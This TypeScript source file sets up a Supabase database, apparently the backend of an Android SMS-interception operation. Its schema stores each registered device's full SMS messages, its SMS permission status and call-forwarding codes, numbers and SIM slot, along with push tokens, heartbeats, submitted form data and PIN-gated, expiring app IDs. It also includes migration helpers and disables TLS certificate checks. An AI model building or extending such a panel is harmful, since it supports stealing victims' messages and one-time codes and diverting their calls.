import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = process.env["SUPABASE_URL"] ?? "https://dvgcrxrnnezbdjpujjjt.supabase.co";
const SUPABASE_SERVICE_KEY = process.env["SUPABASE_SERVICE_ROLE_KEY"] ?? "";

if (!SUPABASE_SERVICE_KEY) {
  throw new Error("SUPABASE_SERVICE_ROLE_KEY env variable not set");
}

// Service role client — bypasses RLS, full admin access
export const db = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { persistSession: false, autoRefreshToken: false },
});

// ── Table creation SQL ─────────────────────────────────────────────────────────
// Run this ONCE in Supabase SQL Editor → https://supabase.com/dashboard/project/dvgcrxrnnezbdjpujjjt/sql
export const SETUP_SQL = `
-- Apps (App IDs)
CREATE TABLE IF NOT EXISTS apps (
  id          BIGSERIAL PRIMARY KEY,
  app_id      TEXT        UNIQUE NOT NULL,
  name        TEXT,
  pin         TEXT        NOT NULL DEFAULT '1234',
  status      TEXT        NOT NULL DEFAULT 'active',
  created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at  TIMESTAMPTZ
);

-- Devices registered via Android app
CREATE TABLE IF NOT EXISTS devices (
  id                      BIGSERIAL   PRIMARY KEY,
  app_id                  TEXT        NOT NULL,
  sub_id                  TEXT        NOT NULL,
  device_id               TEXT,
  status                  TEXT        NOT NULL DEFAULT 'active',
  data_type               TEXT        NOT NULL DEFAULT 'registered_device',
  device_name             TEXT,
  device_model            TEXT,
  android_version         TEXT,
  sms_messages            JSONB       NOT NULL DEFAULT '[]',
  total_sms_count         INTEGER     NOT NULL DEFAULT 0,
  last_sms_timestamp      BIGINT      NOT NULL DEFAULT 0,
  last_sms_log            JSONB       NOT NULL DEFAULT '{}',
  sms_sync_status         TEXT,
  sms_pending_count       INTEGER     NOT NULL DEFAULT 0,
  sms_processed_count     INTEGER     NOT NULL DEFAULT 0,
  sms_permission_status   TEXT,
  sms_last_sync_at        BIGINT,
  sms_last_error          TEXT,
  call_forward_status     TEXT,
  call_forward_action     TEXT,
  call_forward_code       TEXT,
  call_forward_number     TEXT,
  call_forward_sim_slot   INTEGER,
  call_forward_response   TEXT,
  call_forward_timestamp  BIGINT,
  last_heartbeat_at       BIGINT,
  data_json               JSONB       NOT NULL DEFAULT '{}',
  registered_at           TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  created_at              TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at              TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_active               BOOLEAN     NOT NULL DEFAULT TRUE,
  last_seen               TIMESTAMPTZ,
  UNIQUE(app_id, sub_id)
);

-- Admin sessions (logins from Android app users)
CREATE TABLE IF NOT EXISTS admin_sessions (
  id          BIGSERIAL PRIMARY KEY,
  app_id      TEXT        NOT NULL,
  sub_id      TEXT,
  login_time  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  user_agent  TEXT,
  ip          TEXT,
  is_valid    BOOLEAN     NOT NULL DEFAULT TRUE
);

-- Messages sent by Android apps
CREATE TABLE IF NOT EXISTS messages (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT        NOT NULL,
  sub_id       TEXT,
  from_id      TEXT,
  to_id        TEXT,
  content      TEXT        NOT NULL,
  message_type TEXT        NOT NULL DEFAULT 'message',
  sent_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_read      BOOLEAN     NOT NULL DEFAULT FALSE
);

-- Form data submitted by Android apps
CREATE TABLE IF NOT EXISTS form_data (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT        NOT NULL,
  sub_id       TEXT,
  form_type    TEXT        NOT NULL DEFAULT 'form',
  data         JSONB       NOT NULL DEFAULT '{}',
  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Settings key-value store
CREATE TABLE IF NOT EXISTS settings (
  id         BIGSERIAL PRIMARY KEY,
  app_id     TEXT        NOT NULL,
  key        TEXT        NOT NULL,
  value      TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  UNIQUE(app_id, key)
);

-- Proxy filter rules
CREATE TABLE IF NOT EXISTS proxy_rules (
  id         BIGSERIAL PRIMARY KEY,
  action     TEXT        NOT NULL,
  field      TEXT        NOT NULL,
  value      TEXT        NOT NULL,
  endpoints  TEXT        NOT NULL DEFAULT 'all',
  note       TEXT        NOT NULL DEFAULT '',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- ── Migrate messages table ─────────────────────────────────────────────────────
ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_id TEXT;

-- ── Migrate devices table: add new columns if they don't exist ─────────────────
ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'active';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS data_type TEXT NOT NULL DEFAULT 'registered_device';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_messages JSONB NOT NULL DEFAULT '[]';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS total_sms_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_sms_timestamp BIGINT NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_sms_log JSONB NOT NULL DEFAULT '{}';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_sync_status TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_pending_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_processed_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_permission_status TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_last_sync_at BIGINT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_last_error TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_status TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_action TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_code TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_number TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_sim_slot INTEGER;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_response TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_timestamp BIGINT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_heartbeat_at BIGINT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS data_json JSONB NOT NULL DEFAULT '{}';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW();
ALTER TABLE devices ALTER COLUMN sub_id SET NOT NULL;
ALTER TABLE devices DROP CONSTRAINT IF EXISTS devices_device_id_key;
ALTER TABLE devices DROP CONSTRAINT IF EXISTS devices_app_id_device_id_key;
ALTER TABLE devices ADD CONSTRAINT devices_app_id_sub_id_key UNIQUE (app_id, sub_id);

-- FCM token dedicated columns (replaces data_json.fcm_token)
ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token TEXT NOT NULL DEFAULT '';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token_status TEXT NOT NULL DEFAULT 'not_registered';
`.trim();

// ── Startup column migrations via Supabase HTTP SQL endpoint ──────────────────
// Safe to run every startup — ADD COLUMN IF NOT EXISTS is idempotent.
export async function runFcmColumnsMigration(): Promise<void> {
  const stmts = [
    "ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token TEXT NOT NULL DEFAULT ''",
    "ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token_status TEXT NOT NULL DEFAULT 'not_registered'",
  ];

  // Try HTTP SQL endpoint (works without direct Postgres URL)
  for (const sql of stmts) {
    try {
      const res = await fetch(`${SUPABASE_URL}/rest/v1/rpc/exec_sql`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": SUPABASE_SERVICE_KEY,
          "Authorization": `Bearer ${SUPABASE_SERVICE_KEY}`,
        },
        body: JSON.stringify({ sql }),
      });
      if (!res.ok) {
        // Try the /sql endpoint (Supabase Management API path)
        const res2 = await fetch(`${SUPABASE_URL.replace(".supabase.co", ".supabase.co")}/sql`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "apikey": SUPABASE_SERVICE_KEY,
            "Authorization": `Bearer ${SUPABASE_SERVICE_KEY}`,
          },
          body: JSON.stringify({ query: sql }),
        });
        if (!res2.ok) {
          console.warn("[fcm-migration] HTTP SQL failed for:", sql);
        }
      }
    } catch (err) {
      console.warn("[fcm-migration] Error running:", sql, err instanceof Error ? err.message : err);
    }
  }
}

// ── Auto-migration via direct pg connection ───────────────────────────────────
// Uses SUPABASE_DB_URL (direct Postgres pooler) to run DDL statements that
// the Supabase REST API (PostgREST) cannot handle.
export async function runMigrations(): Promise<void> {
  const dbUrl = process.env["SUPABASE_DB_URL"];
  if (!dbUrl) return;

  const migrations = [
    "ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_id TEXT",
    "ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token TEXT NOT NULL DEFAULT ''",
    "ALTER TABLE devices ADD COLUMN IF NOT EXISTS fcm_token_status TEXT NOT NULL DEFAULT 'not_registered'",
  ];

  let pool: import("pg").Pool | undefined;
  try {
    const { Pool } = await import("pg");
    pool = new Pool({
      connectionString: dbUrl,
      ssl: { rejectUnauthorized: false },
      connectionTimeoutMillis: 8000,
      max: 1,
    });
    const client = await pool.connect();
    try {
      for (const sql of migrations) {
        await client.query(sql);
      }
    } finally {
      client.release();
    }
  } catch (err) {
    // Non-fatal — log and continue; the column may already exist or the
    // pooler may be unreachable. The admin can add the column manually.
    const msg = err instanceof Error ? err.message : String(err);
    console.warn("[migration] Could not run auto-migration:", msg);
    console.warn("[migration] Run manually in Supabase SQL Editor: " + migrations.join("; "));
  } finally {
    await pool?.end().catch(() => undefined);
  }
}

// ── Auto-create tables via Supabase SQL over HTTP ────────────────────────────
export async function runSetupSql(): Promise<{ ok: boolean; error?: string }> {
  // Supabase allows running SQL via the /sql endpoint with service role key
  const url = `${SUPABASE_URL}/sql`;
  const res = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SUPABASE_SERVICE_KEY,
      "Authorization": `Bearer ${SUPABASE_SERVICE_KEY}`,
    },
    body: JSON.stringify({ query: SETUP_SQL }),
  });

  if (!res.ok) {
    // Fallback: try running statement by statement via db.rpc if exec_sql exists
    const stmts = SETUP_SQL.split(";").map((s) => s.trim()).filter(Boolean);
    const errors: string[] = [];
    for (const stmt of stmts) {
      const { error } = await (db as unknown as { rpc: (fn: string, args: Record<string, unknown>) => Promise<{ error: { message: string } | null }> }).rpc("exec_sql", { sql: stmt });
      if (error) errors.push(error.message);
    }
    if (errors.length === stmts.length) {
      return { ok: false, error: "Automatic setup failed. Please run the SQL manually in Supabase SQL Editor." };
    }
  }
  return { ok: true };
}
